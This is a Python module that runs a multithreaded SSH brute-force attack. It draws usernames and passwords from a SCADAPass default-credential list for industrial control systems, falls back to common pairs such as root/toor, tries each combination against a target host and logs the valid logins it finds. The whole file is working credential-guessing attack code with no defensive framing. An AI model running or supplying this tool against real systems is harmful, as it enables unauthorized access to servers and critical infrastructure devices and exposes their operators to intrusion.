import paramiko
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.logger import setup_logger
from utils.scadapass_updater import load_scadapass_credentials

logger = setup_logger()

# Suppress paramiko logging
paramiko.util.logging.getLogger("paramiko").setLevel("WARNING")

def try_ssh_login(target, port, user, password, timeout=5):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=target, port=port, username=user, password=password, timeout=timeout, banner_timeout=timeout, auth_timeout=timeout)
        logger.info(f"[✓] Valid SSH credentials: {user}:{password}")
        ssh.close()
        return (user, password)
    except paramiko.AuthenticationException:
        logger.debug(f"[✗] Invalid SSH login for {user}:{password}")
    except Exception as e:
        logger.debug(f"[!] SSH error for {user}:{password} - {e}")
    return None


def ssh_brute_force_with_scadapass(target, scadapass_file=None, system_name=None, port=22, max_workers=20):
    users = []
    passwords = []

    creds = load_scadapass_credentials(scadapass_file) if scadapass_file else {}

    if system_name and system_name in creds:
        users = [u for u, _ in creds[system_name]]
        passwords = [p for _, p in creds[system_name]]
    else:
        for v in creds.values():
            users.extend([u for u, _ in v])
            passwords.extend([p for _, p in v])

    users = list(set(users)) or ['root', 'admin', 'user']
    passwords = list(set(passwords)) or ['toor', '123456', 'admin', 'password']

    logger.info(f"[*] Starting SSH brute force on {target}:{port} with {len(users)} users and {len(passwords)} passwords")

    valid = None
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [
            executor.submit(try_ssh_login, target, port, user, password)
            for user in users
            for password in passwords
        ]
        for future in as_completed(futures):
            result = future.result()
            if result:
                valid = result
                break

    if not valid:
        logger.info("[!] No valid SSH credentials found")
    return valid
